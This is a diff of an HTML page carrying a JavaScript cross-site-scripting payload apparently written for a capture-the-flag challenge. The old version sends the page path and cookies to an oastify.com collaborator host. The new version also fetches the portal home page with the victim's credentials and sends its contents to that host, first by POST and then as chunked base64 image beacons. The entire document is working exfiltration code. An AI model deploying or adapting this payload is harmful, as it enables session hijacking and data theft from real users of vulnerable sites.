@@ -1,11 +1,58 @@
-<!doctype html>
-<meta charset="utf-8">
+<!doctype html><meta charset="utf-8">
 <script>
-/* reachability ping */
-(new Image).src='https://pjc8yqkhil91m51afnd1oa9dz45vtnhc.oastify.com/ping';
+(async () => {
+  const COLLAB = 'https://uecdtvfmdq46hawfas86jf4iu900otci.oastify.com';
+  const ping = (p) => { try { new Image().src = COLLAB + '/ping?' + p } catch(e){} };
+  const b64 = (s) => btoa(unescape(encodeURIComponent(s)));
 
-/* exfil only path + cookies */
-(new Image).src='https://pjc8yqkhil91m51afnd1oa9dz45vtnhc.oastify.com/x'
-  + '?path=' + encodeURIComponent(location.pathname)
-  + '&cookie=' + encodeURIComponent(document.cookie||'');
+  // 1) reachability + minimal context
+  ping('t='+Date.now()
+      +'&path='+encodeURIComponent(location.pathname)
+      +'&cookie='+encodeURIComponent(document.cookie||''));
+
+  // 2) fetch the portal home (same-origin) with cookies
+  let body = '';
+  try {
+    const r = await fetch('https://5119ea598d886cea.chal.ctf.ae/', {credentials:'include', mode:'same-origin'});
+    body = await r.text();
+  } catch (e) {
+    ping('home_err='+encodeURIComponent(String(e)));
+  }
+
+  // 3) try POST first (no size limit)
+  try {
+    await fetch(COLLAB + '/dump', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type':'text/plain'},
+      body: JSON.stringify({
+        path: location.pathname,
+        cookie: document.cookie || '',
+        url: 'https://5119ea598d886cea.chal.ctf.ae/',
+        body: body
+      })
+    });
+    ping('posted=1');
+    return;
+  } catch(e) {
+    ping('post_fail=1');
+  }
+
+  // 4) fallback: chunked GET beacons (avoid URL length issues)
+  try {
+    const enc = b64(body);
+    const CH = 1400; // safe chunk size for query
+    const tot = Math.ceil(enc.length / CH);
+    // announce total
+    ping('chunks='+tot);
+    for (let i=0;i<tot;i++){
+      const part = enc.slice(i*CH, (i+1)*CH);
+      new Image().src = COLLAB + '/x?i='+i+'&n='+tot
+        +'&u='+encodeURIComponent('https://5119ea598d886cea.chal.ctf.ae/')
+        +'&b='+encodeURIComponent(part);
+    }
+  } catch(e) {
+    ping('chunk_err='+encodeURIComponent(String(e)));
+  }
+})();
 </script>
